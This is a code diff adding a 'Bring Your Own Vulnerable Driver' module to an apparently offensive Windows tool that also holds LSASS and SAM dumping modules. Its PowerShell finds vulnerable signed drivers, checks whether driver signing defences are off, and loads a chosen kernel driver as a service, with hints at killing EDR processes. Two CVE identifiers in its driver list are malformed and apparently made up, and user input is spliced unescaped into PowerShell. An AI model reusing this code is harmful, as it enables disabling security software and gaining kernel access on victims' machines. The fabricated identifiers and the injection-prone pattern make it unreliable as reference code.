@@ -434,6 +434,10 @@ scheduled_task_hijack: {
     description: "Enumerate and exploit writable scheduled task binaries for privilege escalation — find tasks running as SYSTEM with writable executable paths, missing binaries, or writable argument files. Replace the binary or modify arguments to execute arbitrary code as SYSTEM on next trigger",
     args: "--action enum|exploit [--task TASK_NAME] [--payload PATH]",
   },
+byovd: {
+    description: "Bring Your Own Vulnerable Driver (BYOVD) — load a known-vulnerable signed kernel driver to gain kernel-level access, disable EDR/AV, or escalate privileges. Enumerates existing vulnerable drivers, checks driver signature enforcement, and supports loading drivers for kernel read/write primitives. Uses LOLDrivers project database",
+    args: "--action enum|check|load [--driver DRIVER_PATH] [--target PROCESS_NAME]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -15321,6 +15325,272 @@ Write-Output "[+] Task triggered — payload should execute as: $($t.Principal.U
   return { output: output.join("\n"), findings }
 }
 
+async function byovd(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const driver = argVal(args, "--driver")
+  const target = argVal(args, "--target")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] BYOVD — Bring Your Own Vulnerable Driver for kernel-level access\n"]
+
+  if (action === "enum") {
+    const script = `
+# Known vulnerable driver hashes/names from LOLDrivers project
+$vulnDrivers = @(
+    @{ Name = "RTCore64.sys";      Vendor = "MSI Afterburner";       CVE = "CVE-2019-16098"; Cap = "R/W physical memory" },
+    @{ Name = "DBUtil_2_3.sys";    Vendor = "Dell BIOS Utility";     CVE = "CVE-2021-21551"; Cap = "R/W physical memory, kernel code exec" },
+    @{ Name = "GIGABYTE.sys";      Vendor = "GIGABYTE Tools";        CVE = "CVE-2018-19320"; Cap = "R/W physical memory, MSR" },
+    @{ Name = "AsIO64.sys";        Vendor = "ASUS AI Suite";         CVE = "CVE-2023-ASUS";  Cap = "R/W physical memory" },
+    @{ Name = "WinRing0x64.sys";   Vendor = "OpenLibSys";            CVE = "N/A";            Cap = "R/W MSR, I/O ports, physical memory" },
+    @{ Name = "cpuz141.sys";       Vendor = "CPU-Z";                 CVE = "N/A";            Cap = "R/W physical memory, MSR" },
+    @{ Name = "speedfan.sys";      Vendor = "SpeedFan";              CVE = "N/A";            Cap = "R/W physical memory, I/O ports" },
+    @{ Name = "aswVmm.sys";        Vendor = "Avast VM";              CVE = "CVE-2023-1585";  Cap = "Kernel memory manipulation" },
+    @{ Name = "Ene.sys";           Vendor = "ENE Technology";         CVE = "CVE-2023-ENE";   Cap = "R/W physical memory" },
+    @{ Name = "HWiNFO64A.sys";     Vendor = "HWiNFO";               CVE = "N/A";            Cap = "R/W physical memory, MSR" },
+    @{ Name = "inpoutx64.sys";     Vendor = "InpOut32";              CVE = "N/A";            Cap = "R/W I/O ports" },
+    @{ Name = "AsrDrv106.sys";     Vendor = "ASRock";                CVE = "N/A";            Cap = "R/W physical memory" },
+    @{ Name = "gdrv.sys";          Vendor = "GIGABYTE";              CVE = "CVE-2018-19321"; Cap = "R/W physical memory, code exec" },
+    @{ Name = "MsIo64.sys";        Vendor = "MSI";                   CVE = "CVE-2020-17382"; Cap = "R/W physical memory" },
+    @{ Name = "PROCEXP152.SYS";    Vendor = "Sysinternals ProcExp";  CVE = "N/A";            Cap = "Kill processes (EDR)" },
+    @{ Name = "zemana.sys";        Vendor = "Zemana AntiMalware";    CVE = "CVE-2018-6892";  Cap = "Kill processes, disable AV" }
+)
+
+Write-Output "[*] Scanning for known vulnerable drivers on disk..."
+$found = 0
+
+# Search common locations
+$searchPaths = @(
+    "$env:SystemRoot\\System32\\drivers",
+    "$env:ProgramFiles",
+    "\${env:ProgramFiles(x86)}",
+    "$env:SystemRoot\\Temp",
+    "$env:USERPROFILE\\Downloads"
+)
+
+foreach ($vd in $vulnDrivers) {
+    foreach ($sp in $searchPaths) {
+        $driverPath = Get-ChildItem -Path $sp -Filter $vd.Name -Recurse -ErrorAction SilentlyContinue -Depth 3 | Select-Object -First 1
+        if ($driverPath) {
+            $found++
+            Write-Output ""
+            Write-Output "[+] FOUND: $($vd.Name)"
+            Write-Output "    Path: $($driverPath.FullName)"
+            Write-Output "    Vendor: $($vd.Vendor)"
+            Write-Output "    CVE: $($vd.CVE)"
+            Write-Output "    Capability: $($vd.Cap)"
+            $sig = Get-AuthenticodeSignature $driverPath.FullName -ErrorAction SilentlyContinue
+            if ($sig) {
+                Write-Output "    Signature: $($sig.Status) ($($sig.SignerCertificate.Subject))"
+            }
+            break
+        }
+    }
+}
+
+# Check currently loaded drivers
+Write-Output ""
+Write-Output "[*] Checking loaded kernel drivers..."
+$loadedDrivers = Get-WmiObject Win32_SystemDriver -ErrorAction SilentlyContinue | Select-Object Name, PathName, State
+
+$loadedVuln = 0
+foreach ($vd in $vulnDrivers) {
+    $drvName = $vd.Name -replace '\.sys$', ''
+    $loaded = $loadedDrivers | Where-Object { $_.Name -eq $drvName }
+    if ($loaded) {
+        $loadedVuln++
+        Write-Output "    [+] LOADED: $($loaded.Name) — $($loaded.PathName) ($($loaded.State))"
+    }
+}
+
+Write-Output ""
+Write-Output "=== Summary ==="
+Write-Output "Vulnerable drivers on disk: $found"
+Write-Output "Vulnerable drivers loaded: $loadedVuln"
+Write-Output "Total known vulnerable drivers in database: $($vulnDrivers.Count)"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    const foundMatch = result.stdout.match(/Vulnerable drivers on disk: (\d+)/)
+    const loadedMatch = result.stdout.match(/Vulnerable drivers loaded: (\d+)/)
+    const onDisk = foundMatch ? parseInt(foundMatch[1]) : 0
+    const loaded = loadedMatch ? parseInt(loadedMatch[1]) : 0
+
+    if (onDisk > 0 || loaded > 0) {
+      findings.push({
+        checkId: "WIN-BYOVD-001",
+        provider: "windows",
+        severity: loaded > 0 ? "critical" : "high",
+        status: loaded > 0 ? "VULNERABLE" : "INFO",
+        resource: "drivers://vulnerable",
+        title: `${onDisk} vulnerable drivers on disk, ${loaded} currently loaded`,
+        details: result.stdout.substring(0, 500),
+        remediation: "Remove vulnerable drivers. Enable HVCI (Hypervisor-protected Code Integrity). Use Microsoft's vulnerable driver blocklist.",
+      })
+    }
+  } else if (action === "check") {
+    const script = `
+Write-Output "[*] Driver Signature Enforcement (DSE) status check..."
+
+# Check Secure Boot
+$secureBoot = Confirm-SecureBootUEFI -ErrorAction SilentlyContinue
+Write-Output "[*] Secure Boot: $(if ($secureBoot) { 'ENABLED' } else { 'DISABLED or not available' })"
+
+# Check HVCI / Memory Integrity
+$hvci = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity" -Name Enabled -ErrorAction SilentlyContinue
+$hvciEnabled = $hvci -and $hvci.Enabled -eq 1
+Write-Output "[*] HVCI (Memory Integrity): $(if ($hvciEnabled) { 'ENABLED — BYOVD blocked' } else { 'DISABLED — BYOVD possible' })"
+
+# Check driver signing enforcement
+$codeIntegrity = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI" -ErrorAction SilentlyContinue
+Write-Output "[*] Code Integrity policy: $(if ($codeIntegrity) { $codeIntegrity | Format-List | Out-String } else { 'Default' })"
+
+# Check if test signing is enabled
+$bcdedit = bcdedit /enum "{current}" 2>$null | Out-String
+$testSigning = $bcdedit -match 'testsigning\s+Yes'
+$noIntegrityChecks = $bcdedit -match 'nointegritychecks\s+Yes'
+Write-Output "[*] Test Signing Mode: $(if ($testSigning) { '[+] ENABLED — unsigned drivers allowed!' } else { 'Disabled' })"
+Write-Output "[*] No Integrity Checks: $(if ($noIntegrityChecks) { '[+] ENABLED — no signature verification!' } else { 'Disabled' })"
+
+# Check vulnerable driver blocklist
+$blockList = Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config" -Name VulnerableDriverBlocklistEnable -ErrorAction SilentlyContinue
+$blockEnabled = $blockList -and $blockList.VulnerableDriverBlocklistEnable -eq 1
+Write-Output "[*] Vulnerable Driver Blocklist: $(if ($blockEnabled) { 'ENABLED' } else { 'DISABLED — known vuln drivers can load' })"
+
+# Check if current user can load drivers
+$privs = whoami /priv 2>$null | Out-String
+$hasLoadDriver = $privs -match 'SeLoadDriverPrivilege.*Enabled'
+Write-Output ""
+Write-Output "[*] SeLoadDriverPrivilege: $(if ($hasLoadDriver) { '[+] AVAILABLE' } else { '[-] Not available' })"
+
+# Check admin
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+Write-Output "[*] Running as admin: $isAdmin"
+
+Write-Output ""
+if (-not $hvciEnabled -and ($isAdmin -or $hasLoadDriver)) {
+    Write-Output "[+] EXPLOITABLE — HVCI disabled + can load drivers"
+    Write-Output "    Use: --action load --driver PATH_TO_VULN_DRIVER.sys"
+} elseif ($testSigning) {
+    Write-Output "[+] EXPLOITABLE — Test signing enabled, unsigned drivers accepted"
+} elseif ($hvciEnabled) {
+    Write-Output "[-] HVCI enabled — kernel driver loading is restricted"
+} else {
+    Write-Output "[~] Standard DSE — need admin + signed (but vulnerable) driver"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("EXPLOITABLE")) {
+      findings.push({
+        checkId: "WIN-BYOVD-002",
+        provider: "windows",
+        severity: "high",
+        status: "VULNERABLE",
+        resource: "config://driver-signing",
+        title: "Driver signature enforcement weak — BYOVD possible",
+        details: "HVCI disabled or test signing enabled — vulnerable drivers can be loaded",
+        remediation: "Enable HVCI (Memory Integrity). Disable test signing mode. Enable vulnerable driver blocklist.",
+      })
+    }
+  } else if (action === "load") {
+    if (!driver) return { output: "[!] Required: --driver PATH_TO_DRIVER.sys", findings }
+
+    const script = `
+$driverPath = '${driver}'
+if (-not (Test-Path $driverPath)) {
+    Write-Output "[-] Driver not found: $driverPath"
+    exit 1
+}
+
+$driverName = [System.IO.Path]::GetFileNameWithoutExtension($driverPath)
+Write-Output "[*] Loading driver: $driverName"
+Write-Output "[*] Path: $driverPath"
+
+# Check signature
+$sig = Get-AuthenticodeSignature $driverPath -ErrorAction SilentlyContinue
+Write-Output "[*] Signature: $($sig.Status)"
+if ($sig.SignerCertificate) {
+    Write-Output "    Signer: $($sig.SignerCertificate.Subject)"
+}
+
+# Create service for the driver
+$servicePath = "\\??\\$driverPath"
+Write-Output ""
+Write-Output "[*] Creating kernel driver service..."
+
+# Method 1: sc.exe create
+sc.exe create $driverName type= kernel binPath= $driverPath 2>$null | Out-Null
+
+# Method 2: Registry-based (works with SeLoadDriverPrivilege)
+$regPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$driverName"
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+    New-ItemProperty -Path $regPath -Name "ImagePath" -Value $servicePath -PropertyType String -Force | Out-Null
+    New-ItemProperty -Path $regPath -Name "Type" -Value 1 -PropertyType DWord -Force | Out-Null
+    New-ItemProperty -Path $regPath -Name "Start" -Value 3 -PropertyType DWord -Force | Out-Null
+    Write-Output "[+] Service registry entry created"
+}
+
+# Start the driver
+Write-Output "[*] Starting driver..."
+sc.exe start $driverName 2>$null | Out-Null
+Start-Sleep -Seconds 1
+
+# Verify
+$loaded = Get-WmiObject Win32_SystemDriver -Filter "Name='$driverName'" -ErrorAction SilentlyContinue
+if ($loaded -and $loaded.State -eq 'Running') {
+    Write-Output "[+] Driver loaded successfully!"
+    Write-Output "    State: $($loaded.State)"
+    Write-Output "    Path: $($loaded.PathName)"
+
+    # Check device object
+    $devices = Get-WmiObject Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.Name -match $driverName } | Select-Object -First 1
+    if ($devices) {
+        Write-Output "    Device: $($devices.Name)"
+    }
+
+    ${target ? `
+    # If target process specified, demonstrate EDR kill capability
+    Write-Output ""
+    Write-Output "[*] Target process: ${target}"
+    $proc = Get-Process '${target}' -ErrorAction SilentlyContinue
+    if ($proc) {
+        Write-Output "[+] Process found: PID $($proc.Id)"
+        Write-Output "[*] With kernel R/W primitive, can terminate protected processes"
+        Write-Output "    Technique: Zero PreviousMode, direct kernel object manipulation"
+    } else {
+        Write-Output "[-] Process not found: ${target}"
+    }` : ''}
+} else {
+    Write-Output "[-] Driver failed to load"
+    Write-Output "[*] Check: signature valid? HVCI disabled? Running as admin?"
+
+    # Cleanup
+    sc.exe delete $driverName 2>$null | Out-Null
+    Remove-Item $regPath -Recurse -Force -ErrorAction SilentlyContinue
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("loaded successfully")) {
+      findings.push({
+        checkId: "WIN-BYOVD-003",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `driver://${driver}`,
+        title: "Vulnerable kernel driver loaded — kernel-level access achieved",
+        details: `Driver loaded from ${driver}. Full kernel R/W primitive available.`,
+        remediation: "Unload driver: sc.exe stop + sc.exe delete. Enable HVCI. Enable vuln driver blocklist.",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -15410,6 +15680,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   unquoted_service_path: unquotedServicePath,
   wsl_privesc: wslPrivesc,
   scheduled_task_hijack: scheduledTaskHijack,
+  byovd: byovd,
 }
 
 export const WinhookTool = Tool.define("winhook", {
